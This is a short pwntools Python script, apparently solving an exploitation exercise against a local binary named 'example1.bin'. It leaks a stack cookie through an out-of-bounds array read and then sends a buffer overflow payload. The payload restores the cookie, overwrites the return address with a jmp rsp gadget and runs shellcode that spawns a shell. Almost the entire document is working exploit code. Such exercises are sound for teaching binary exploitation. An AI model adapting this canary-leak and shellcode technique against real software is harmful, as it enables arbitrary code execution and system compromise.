 
from pwn import *

# jmp rsp found that that address 'ff e4'
JMPRSP = 0x401410

# Pattern create and pattern search located the offset of the buffer to the cookie address
OFFSET = 40

# Shellcode
context.arch = "amd64"
SC = asm(shellcraft.amd64.linux.sh())

# Start process
p = process("example1.bin")

# Read a value from the array
p.sendline(b"3")

# Read outside the array to the location of the cookie, the error is there is no bounds check
p.sendline(b"11")

# Read until we reach the cookie val
p.readuntil(b"Current price: ")

# Read in the cookie but exclude the newline char
cookie = p.readuntil(b"\n")
cookie = cookie[:-1]

# Now overflow the buffer making sure to place the cookie back
p.sendline(b"2")
p.sendline(b"A"*OFFSET + p64(int(cookie), sign="signed") + b"AAAAAAAA" + p64(JMPRSP) + SC)

# Exit
p.sendline(b"4")

p.interactive()
